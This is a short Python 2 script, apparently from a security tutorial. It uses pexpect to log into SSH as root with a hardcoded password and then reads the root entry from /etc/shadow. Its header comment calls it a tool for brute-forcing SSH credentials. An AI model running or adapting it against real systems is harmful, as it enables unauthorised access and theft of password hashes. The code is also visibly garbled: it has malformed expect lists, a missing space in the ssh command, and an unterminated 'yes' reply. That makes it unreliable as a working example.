# Prerequisite of this script is to install the Pexpect module , which has the ability to interact with programs , watch for
# expected outputs and then respond based on expected outputs. It's an excellent tool of choice for automating the process of brute 
# forcing SSH user credentials.

import pexpect
PROMPT = ['#' , '>>>', '> ','\$ ']
def send_command(child, cmd):
  child.sendline(cmd)
  child.expect(PROMPT)
  print child.before
def connect(user,host,password):
  ssh_newkey = "Are you sure you want to continue connecting"
  connStr = 'ssh' + user + '@' + host
  child = pexpect.spawn(connStr)
  ret = child.expect([pexpect.TIMEOUT,ssh_newkey.\ '[P|p]assword:'])
  if ret == 0:
    print '[-] Error Connecting'
    return 
  if ret == 1:
    child.send('yes')
    ret = child.expect([pexpect.TIMEOUT.\'[P|p]assword:'])
  if ret == 0:
    print '[-] Error Connecting'
    return 
  child.sendline(password)
  child.expect(PROMPT)
  return child
def main():
  host = 'localhost'
  user = 'root'
  password = 'toor'
  child = connect(user, host, password)
  send_command(child, 'cat /etc/shadow | grep root')
if __name__=='__main__':
  main()
    
